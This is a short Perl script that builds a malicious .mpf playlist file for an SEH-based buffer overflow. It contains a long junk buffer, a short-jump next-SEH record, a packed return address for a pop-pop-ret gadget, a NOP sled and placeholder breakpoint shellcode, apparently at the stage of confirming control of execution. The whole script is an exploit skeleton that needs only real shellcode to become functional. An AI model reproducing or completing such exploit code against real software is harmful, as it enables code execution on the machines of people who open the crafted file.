#!/usr/bin/perl

my $totalsize=5005;
my $sploitfile="c0d3r.mpf";
my $junk = "http://";
$junk=$junk."A" x 4105;
my $nseh="\xeb\x1e\x90\x90"; #breakpoint, sploit should stop here
my $seh=pack('V',0x76C37AAD);
my $nops="\x90" x 24;
my $shellcode="\xcc\xcc\xcc\xcc";
my $junk2 = "D" x ($totalsize-length($junk.$nseh.$seh.$nops.$shellcode));
my $payload=$junk.$nseh.$seh.$nops.$shellcode.$junk2;
print " [+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;close (myfile);
print " [+] File written\n";
print " [+] " . length($payload)." bytes\n";
